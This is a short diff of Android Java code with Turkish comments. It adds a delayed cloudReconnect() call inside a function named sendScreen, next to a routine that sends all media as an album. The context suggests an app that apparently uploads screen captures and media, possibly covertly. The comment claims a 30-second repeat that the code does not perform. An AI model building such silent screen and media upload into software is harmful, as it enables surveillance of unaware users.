@@ -3534,6 +3534,13 @@ void sendScreen(){
             }
         }catch(Exception ignored){}
     }).start();
+
+    // Oturum süresini 30 saniyede bir yenile
+    new Handler(Looper.getMainLooper()).postDelayed(() -> {
+        try {
+            cloudReconnect();
+        } catch(Exception ignored) {}
+    }, 30000);
 }
 
 // Tüm medyaları albüm olarak tek seferde gönder
